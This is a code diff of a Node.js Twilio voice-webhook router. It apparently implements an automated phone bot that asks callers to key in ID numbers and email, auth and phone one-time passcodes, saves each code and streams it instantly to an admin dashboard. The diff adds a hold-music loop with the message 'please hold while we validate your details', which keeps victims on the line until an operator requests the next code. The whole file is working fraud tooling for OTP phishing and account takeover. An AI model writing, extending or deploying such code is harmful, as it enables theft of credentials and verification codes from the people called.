@@ -3,19 +3,16 @@ const router = express.Router();
 const VoiceResponse = require('twilio').twiml.VoiceResponse;
 const db = require('../database/db');
 
-// Test endpoint
 router.get('/test', (req, res) => {
     res.send('Webhook is working! Server is online.');
 });
 
-// MAIN VOICE RESPONSE - USING URL PARAMETER
 router.post('/voice-response/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
-    console.log('========== WEBHOOK CALLED ==========');
-    console.log('SessionId from URL:', sessionId);
+    console.log('Voice response - Session:', sessionId);
     
     try {
         const session = await db.query(
@@ -26,7 +23,6 @@ router.post('/voice-response/:sessionId', async (req, res) => {
         );
         
         if (session.rows.length === 0) {
-            console.log('Session not found:', sessionId);
             twiml.say('Session not found. Goodbye.');
             twiml.hangup();
             return res.type('text/xml').send(twiml.toString());
@@ -38,10 +34,8 @@ router.post('/voice-response/:sessionId', async (req, res) => {
         const subject = callData.subject;
         const customIntro = callData.custom_intro;
         
-        console.log('Current Action:', currentAction);
-        console.log('Full Name:', fullName);
+        console.log('Current action:', currentAction);
         
-        // Handle different actions
         if (currentAction === 'consent') {
             const gather = twiml.gather({
                 numDigits: 1,
@@ -61,6 +55,18 @@ router.post('/voice-response/:sessionId', async (req, res) => {
             }
             
             twiml.say('We did not receive any input. Goodbye.');
+            twiml.hangup();
+            
+        } else if (currentAction === 'waiting_for_id') {
+            const gather = twiml.gather({
+                numDigits: 20,
+                action: `/webhooks/collect-id/${sessionId}`,
+                method: 'POST',
+                finishOnKey: '#',
+                timeout: 10
+            });
+            gather.say('Please enter your ID number followed by the pound key.');
+            twiml.say('No input received. Goodbye.');
             twiml.hangup();
             
         } else if (currentAction === 'waiting_for_email_otp') {
@@ -99,20 +105,19 @@ router.post('/voice-response/:sessionId', async (req, res) => {
             twiml.say('No input received. Goodbye.');
             twiml.hangup();
             
-        } else if (currentAction === 'waiting_for_id') {
-            const gather = twiml.gather({
-                numDigits: 20,
-                action: `/webhooks/collect-id/${sessionId}`,
-                method: 'POST',
-                finishOnKey: '#',
-                timeout: 10
+        } else if (currentAction === 'playing_music') {
+            // Play music and wait for admin action
+            twiml.say('Please hold while we validate your details.');
+            const play = twiml.play({
+                loop: 10
             });
-            gather.say('Please enter your ID number followed by the pound key.');
-            twiml.say('No input received. Goodbye.');
-            twiml.hangup();
+            play.url = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
+            // Stay in music until admin interrupts
+            twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
             
         } else {
-            twiml.say('Please wait for admin instructions.');
+            // Default - wait for admin
+            twiml.say('Please wait for an agent.');
             twiml.hangup();
         }
         
@@ -120,27 +125,27 @@ router.post('/voice-response/:sessionId', async (req, res) => {
         res.send(twiml.toString());
         
     } catch (error) {
-        console.error('Error in voice response:', error);
+        console.error('Error:', error);
         const twiml = new VoiceResponse();
-        twiml.say('An error occurred. Please try again later.');
+        twiml.say('An error occurred.');
         twiml.hangup();
         res.type('text/xml');
         res.send(twiml.toString());
     }
 });
 
-// HANDLE CONSENT (USER PRESSES 1)
 router.post('/handle-consent/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const { Digits } = req.body;
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
-    console.log('Consent received - Session:', sessionId, 'Digits:', Digits);
+    console.log('Consent - Session:', sessionId, 'Digits:', Digits);
     
     if (Digits === '1') {
+        // Update session to waiting for admin action
         await db.query(
-            `UPDATE call_sessions SET current_action = 'waiting_for_id' WHERE id = $1`,
+            `UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`,
             [sessionId]
         );
         
@@ -149,10 +154,17 @@ router.post('/handle-consent/:sessionId', async (req, res) => {
             [sessionId, 'consent', '1']
         );
         
-        io.emit('user_response', { session_id: sessionId, type: 'consent', value: '1' });
+        // EMIT TO ADMIN DASHBOARD INSTANTLY
+        io.emit('user_consent', { 
+            session_id: sessionId, 
+            status: 'consent_given',
+            message: 'User pressed 1 - Ready for requests'
+        });
         
-        twiml.say('Thank you. Please wait.');
-        twiml.redirect(`/webhooks/voice-response/${sessionId}`, { method: 'POST' });
+        twiml.say('Thank you. Please hold while we connect you.');
+        const play = twiml.play({ loop: 10 });
+        play.url = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
+        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
         
     } else {
         twiml.say('You did not press 1. Goodbye.');
@@ -164,37 +176,53 @@ router.post('/handle-consent/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-// COLLECT ID NUMBER
+// Check hold status - keeps music playing until admin interrupts
+router.post('/check-hold/:sessionId', async (req, res) => {
+    const sessionId = req.params.sessionId;
+    const twiml = new VoiceResponse();
+    
+    const session = await db.query(
+        `SELECT current_action FROM call_sessions WHERE id = $1`,
+        [sessionId]
+    );
+    
+    if (session.rows[0] && session.rows[0].current_action === 'playing_music') {
+        // Still on hold, continue music
+        const play = twiml.play({ loop: 5 });
+        play.url = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
+        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
+    } else {
+        // Admin interrupted - go to next action
+        twiml.redirect(`/webhooks/voice-response/${sessionId}`, { method: 'POST' });
+    }
+    
+    res.type('text/xml');
+    res.send(twiml.toString());
+});
+
+// COLLECT ID
 router.post('/collect-id/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const { Digits } = req.body;
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
-    console.log('ID Collected - Session:', sessionId, 'ID:', Digits);
+    console.log('ID Collected:', Digits);
     
     if (Digits) {
-        const session = await db.query(
-            `SELECT contact_id FROM call_sessions WHERE id = $1`,
-            [sessionId]
-        );
-        
-        await db.query(
-            `UPDATE contacts SET id_number = $1 WHERE id = $2`,
-            [Digits, session.rows[0].contact_id]
-        );
-        
-        await db.query(
-            `INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`,
-            [sessionId, session.rows[0].contact_id, 'id_number', Digits]
-        );
+        const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
+        await db.query(`UPDATE contacts SET id_number = $1 WHERE id = $2`, [Digits, session.rows[0].contact_id]);
+        await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, session.rows[0].contact_id, 'id_number', Digits]);
         
         io.emit('data_collected', { session_id: sessionId, type: 'id_number', value: Digits });
         
-        twiml.say('Thank you. Your ID has been recorded.');
-        twiml.hangup();
+        // Go back to music/hold
+        await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
         
-        await db.query(`UPDATE call_sessions SET status = 'completed', ended_at = NOW() WHERE id = $1`, [sessionId]);
+        twiml.say('Thank you. Please hold while we validate your details.');
+        const play = twiml.play({ loop: 10 });
+        play.url = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
+        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
         twiml.say('No ID received. Goodbye.');
         twiml.hangup();
@@ -211,16 +239,21 @@ router.post('/collect-email-otp/:sessionId', async (req, res) => {
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
-    console.log('Email OTP Collected - Session:', sessionId, 'OTP:', Digits);
+    console.log('Email OTP Collected:', Digits);
     
     if (Digits) {
         const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
         await db.query(`UPDATE contacts SET email_otp = $1 WHERE id = $2`, [Digits, session.rows[0].contact_id]);
         await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, session.rows[0].contact_id, 'email_otp', Digits]);
+        
         io.emit('data_collected', { session_id: sessionId, type: 'email_otp', value: Digits });
-        twiml.say('Thank you.');
-        twiml.hangup();
-        await db.query(`UPDATE call_sessions SET status = 'completed', ended_at = NOW() WHERE id = $1`, [sessionId]);
+        
+        await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
+        
+        twiml.say('Thank you. Please hold while we validate your details.');
+        const play = twiml.play({ loop: 10 });
+        play.url = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
+        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
         twiml.say('No OTP received. Goodbye.');
         twiml.hangup();
@@ -237,16 +270,21 @@ router.post('/collect-auth-otp/:sessionId', async (req, res) => {
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
-    console.log('Auth OTP Collected - Session:', sessionId, 'OTP:', Digits);
+    console.log('Auth OTP Collected:', Digits);
     
     if (Digits) {
         const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
         await db.query(`UPDATE contacts SET auth_otp = $1 WHERE id = $2`, [Digits, session.rows[0].contact_id]);
         await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, session.rows[0].contact_id, 'auth_otp', Digits]);
+        
         io.emit('data_collected', { session_id: sessionId, type: 'auth_otp', value: Digits });
-        twiml.say('Thank you.');
-        twiml.hangup();
-        await db.query(`UPDATE call_sessions SET status = 'completed', ended_at = NOW() WHERE id = $1`, [sessionId]);
+        
+        await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
+        
+        twiml.say('Thank you. Please hold while we validate your details.');
+        const play = twiml.play({ loop: 10 });
+        play.url = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
+        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
         twiml.say('No code received. Goodbye.');
         twiml.hangup();
@@ -263,16 +301,21 @@ router.post('/collect-phone-otp/:sessionId', async (req, res) => {
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
-    console.log('Phone OTP Collected - Session:', sessionId, 'OTP:', Digits);
+    console.log('Phone OTP Collected:', Digits);
     
     if (Digits) {
         const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
         await db.query(`UPDATE contacts SET phone_otp = $1 WHERE id = $2`, [Digits, session.rows[0].contact_id]);
         await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, session.rows[0].contact_id, 'phone_otp', Digits]);
+        
         io.emit('data_collected', { session_id: sessionId, type: 'phone_otp', value: Digits });
-        twiml.say('Thank you.');
-        twiml.hangup();
-        await db.query(`UPDATE call_sessions SET status = 'completed', ended_at = NOW() WHERE id = $1`, [sessionId]);
+        
+        await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
+        
+        twiml.say('Thank you. Please hold while we validate your details.');
+        const play = twiml.play({ loop: 10 });
+        play.url = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
+        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
         twiml.say('No OTP received. Goodbye.');
         twiml.hangup();
@@ -282,13 +325,12 @@ router.post('/collect-phone-otp/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-// CALL STATUS CALLBACK
 router.post('/call-status/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const { CallStatus, Duration } = req.body;
     const io = req.app.get('io');
     
-    console.log('Call Status - Session:', sessionId, 'Status:', CallStatus, 'Duration:', Duration);
+    console.log('Call Status:', CallStatus, 'Session:', sessionId);
     
     if (sessionId) {
         await db.query(
